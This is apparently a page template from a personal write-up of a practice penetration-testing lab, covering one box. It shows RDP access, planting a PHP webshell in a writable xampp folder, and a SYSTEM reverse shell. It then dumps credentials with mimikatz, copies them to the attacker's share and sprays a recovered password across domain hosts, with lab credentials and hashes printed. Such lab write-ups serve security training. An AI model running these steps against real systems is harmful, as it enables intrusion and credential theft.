@@ -1,0 +1,219 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX7</h1>
+    <h2 class="subtitle">RDP</h2>
+    <p class="text">Since we know we can use RDP, we can simply access to the target machine using rdesktop.</p>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ proxychains4 rdesktop 172.16.67.7 -u relia.com\michelle -p 'NotMyPassword0k?'</code></pre></div>
+
+<p class="text">The username would be changed to INTRANET/relia.com\michelle, so we need to revert to relia.com\michelle and re-enter password since it's AD user, not local user.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/7/1.png' %}" alt="">
+    <p class="text">There is local.txt.</p>
+</div>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<div class="code-box"><pre><code>PS C:\xampp\htdocs> netstat -nto
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID      Offload State
+
+  TCP    <u>127.0.0.1:80</u>           127.0.0.1:57167        ESTABLISHED     2288     InHost
+  TCP    127.0.0.1:57167        127.0.0.1:80           ESTABLISHED     352      InHost
+  TCP    127.0.0.1:57180        127.0.0.1:57179        TIME_WAIT       0        InHost
+  TCP    127.0.0.1:57191        127.0.0.1:57190        TIME_WAIT       0        InHost
+  TCP    127.0.0.1:57197        127.0.0.1:57196        TIME_WAIT       0        InHost
+  TCP    127.0.0.1:57201        127.0.0.1:57200        TIME_WAIT       0        InHost
+  TCP    127.0.0.1:57205        127.0.0.1:57204        TIME_WAIT       0        InHost
+  TCP    127.0.0.1:57209        127.0.0.1:57208        TIME_WAIT       0        InHost
+  TCP    127.0.0.1:57213        127.0.0.1:57212        TIME_WAIT       0        InHost
+  TCP    127.0.0.1:57217        127.0.0.1:57216        TIME_WAIT       0        InHost
+  TCP    127.0.0.1:57221        127.0.0.1:57220        TIME_WAIT       0        InHost
+  TCP    127.0.0.1:57225        127.0.0.1:57224        TIME_WAIT       0        InHost
+  TCP    127.0.0.1:57229        127.0.0.1:57228        TIME_WAIT       0        InHost
+  TCP    127.0.0.1:57233        127.0.0.1:57232        TIME_WAIT       0        InHost
+  TCP    127.0.0.1:57238        127.0.0.1:57237        TIME_WAIT       0        InHost
+  TCP    127.0.0.1:57243        127.0.0.1:57242        TIME_WAIT       0        InHost
+  TCP    172.16.67.7:3389       172.16.67.254:53258    ESTABLISHED     372      InHost
+  TCP    172.16.67.7:57248      172.16.67.6:135        TIME_WAIT       0        InHost
+  TCP    172.16.67.7:57249      172.16.67.6:54765      TIME_WAIT       0        InHost
+  TCP    [::1]:3306             [::1]:57247            TIME_WAIT       0        InHost
+  TCP    [::1]:57178            [::1]:3306             TIME_WAIT       0        InHost
+  TCP    [::1]:57236            [::1]:80               TIME_WAIT       0        InHost
+  TCP    [::1]:57247            [::1]:3306             TIME_WAIT       0        InHost</code></pre></div>
+
+<div class="code-box"><pre><code>
+PS C:\xampp\htdocs> tasklist /v /FI "PID eq 2288"
+>>
+
+Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title
+========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================
+httpd.exe                     2288 Services                   0     19,664 K Unknown         N/A                                                     0:00:00 N/A</code></pre></div>
+
+  <p class="text">Box7 is running http host and SPN is N/A, which stands for NT AUTHORITY user. </p>
+
+  <div class="img">
+    <img src="{% static 'EthHack/images/relia/7/2.png' %}" alt="">
+    <p class="text">Opening http://127.0.0.1, we can know the server is ran by xampp. If we can edit file under the htdocs folder, we can get reverse shell from NA user.</p>
+  </div>
+
+<div class="code-box"><pre><code>PS C:\xampp\htdocs> icacls .
+. NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+  BUILTIN\Administrators:(I)(OI)(CI)(F)
+  BUILTIN\Users:(I)(OI)(CI)(RX)
+  BUILTIN\Users:(I)(CI)(AD)
+  BUILTIN\Users:(I)(CI)<u>(WD)</u>
+  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files</code></pre></div>
+
+<p class="text">BUILTIN\Users has write privilege!</p>
+<div class="code-box"><pre><code>PS C:\xampp\htdocs> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
+RELIA\INTRANETRDP                          Group            S-1-5-21-3972710054-930304531-4277621697-1116 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192</code></pre></div>
+
+<p class="text">We seem to be able to write file under the htdocs.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/7/3.png' %}" alt="">
+    <p class="text">I wrote simple php webshell. You can simply write or download from your machine.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/7/4.png' %}" alt="">
+    <p class="text">cmd=whoami successfully returned the NT AUTHORITY\system. We can copy and paste base64 revshell code from <a href="https://www.revshells.com/">revshell.com</a> and pwn authority user.</p>
+</div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ nc -lvnp 4444                                  
+listening on [any] 4444 ...
+connect to [192.168.45.222] from (UNKNOWN) [192.168.107.191] 63825
+whoami
+nt authority\system
+PS C:\xampp\htdocs> </code></pre></div>
+
+<p class="text">Then, I installed mimikatz.exe from my machine, and downloaded output to my machine.</p>
+<div class="code-box"><pre><code>PS C:\users\administrator\desktop> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > intranet_mimikatz
+PS C:\users\administrator\desktop> dir
+
+
+    Directory: C:\users\administrator\desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----        11/21/2025   3:08 PM          33460 intranet_mimikatz                                                    
+-a----        11/15/2025   7:10 AM        1355264 mimikatz.exe                                                         
+-a----        11/21/2025   2:23 PM             34 proof.txt                                                            
+
+
+PS C:\users\administrator\desktop> copy intranet_mimikatz \\192.168.45.222\share</code></pre></div>
+
+<p class="text">Then, I found an user credential for andrea.</p>
+<div class="code-box"><pre><code>Authentication Id : 0 ; 334843 (00000000:00051bfb)
+Session           : Service from 0
+User Name         : <u>andrea</u>
+Domain            : RELIA
+Logon Server      : DC02
+Logon Time        : 9/17/2024 5:20:09 AM
+SID               : S-1-5-21-3972710054-930304531-4277621697-1106
+        msv :
+         [00000003] Primary
+         * Username : andrea
+         * Domain   : RELIA
+         * NTLM     : ce3f12443651168b3793f5fbcccff9db
+         * SHA1     : 65b6774d091b82d025fc5422368f9d3d34589b84
+         * DPAPI    : 6739979a37698ce72d0401422d3203c2
+        tspkg :
+        wdigest :
+         * Username : andrea
+         * Domain   : RELIA
+         * Password : (null)
+        kerberos :
+         * Username : andrea
+         * Domain   : RELIA.COM
+         * Password : <u>PasswordPassword_6</u>
+        ssp :
+        credman :
+        cloudap :</code></pre></div>
+
+
+        <h2 class="subtitle">Andrea : privilege enumeration</h2>
+
+        <div class="code-box"><pre><code>PS C:\users\administrator\desktop> net user andrea /domain
+The request will be processed at a domain controller for domain relia.com.
+
+User name                    andrea
+Full Name                    Andrea Rossi
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/27/2022 2:14:09 AM
+Password expires             Never
+Password changeable          10/28/2022 2:14:09 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   5/16/2024 3:50:10 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      
+Global Group memberships     *Domain Users         *WKRDP                
+The command completed successfully.</code></pre></div>
+
+<p class="text">Again, Andrea seems to have RDP right against WK host.</p>
+
+<div class="code-box"><pre><code>└─$ proxychains4 nxc rdp internal -u andrea -p 'PasswordPassword_6'
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+RDP         172.16.67.15    3389   WK02             [*] Windows 10 or Windows Server 2016 Build 22000 (name:WK02) (domain:relia.com) (nla:True)
+RDP         172.16.67.6     3389   DC02             [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC02) (domain:relia.com) (nla:True)
+RDP         172.16.67.30    3389   WEBBY            [*] Windows 10 or Windows Server 2016 Build 20348 (name:WEBBY) (domain:relia.com) (nla:True)
+RDP         172.16.67.14    3389   WK01             [*] Windows 10 or Windows Server 2016 Build 22000 (name:WK01) (domain:relia.com) (nla:True)
+RDP         172.16.67.15    3389   WK02             [+] relia.com\andrea:PasswordPassword_6 (Pwn3d!)
+RDP         172.16.67.7     3389   INTRANET         [*] Windows 10 or Windows Server 2016 Build 20348 (name:INTRANET) (domain:relia.com) (nla:False)
+RDP         172.16.67.6     3389   DC02             [+] relia.com\andrea:PasswordPassword_6 
+RDP         172.16.67.30    3389   WEBBY            [+] relia.com\andrea:PasswordPassword_6 
+RDP         172.16.67.14    3389   WK01             [+] relia.com\andrea:PasswordPassword_6 
+RDP         172.16.67.7     3389   INTRANET         [+] relia.com\andrea:PasswordPassword_6 </code></pre></div>
+
+<p class="text">We seemignly pwned WK02 machine.</p>
+
+
+</body>
+</html>
